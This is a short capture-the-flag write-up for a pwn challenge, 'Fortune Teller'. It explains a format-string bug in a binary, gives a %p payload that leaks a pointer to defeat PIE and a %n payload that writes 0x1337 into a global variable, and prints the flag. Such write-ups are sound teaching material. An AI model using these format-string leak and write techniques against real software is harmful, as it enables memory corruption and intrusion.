## 🔗 [Pwn] Fortune Teller

The oracle will answer any question, but it may reveal more than it should.

---

### Attachments

- [fortune_teller_public.zip](fortune_teller_public.zip)

---

### Solution

The binary asks for a "question," then passes it straight to `printf` as the format string instead of as data — a classic format-string bug. A global `blessing` starts at 0, and a separate menu option prints the flag only if `blessing == 0x1337`, but nothing ever sets it.

So the plan is: leak a pointer to defeat PIE, then use `%n` to write `0x1337` into `blessing`.

```text
%41$p              # leaks a return address inside the binary -> gives PIE base
%4919c%8$n         # prints 4919 (0x1337) chars, then writes that count to blessing
```

Solver: [solver.py](solver.py)

---

### Flag

```
FortID{Fortun3_Fav0r5_Th3_b0ld_bu7_al50_Th05e_Th4t_C4n_Expl0i7_F0rma7_Str1ng_VulnZZ_f7253b0d5b}
```
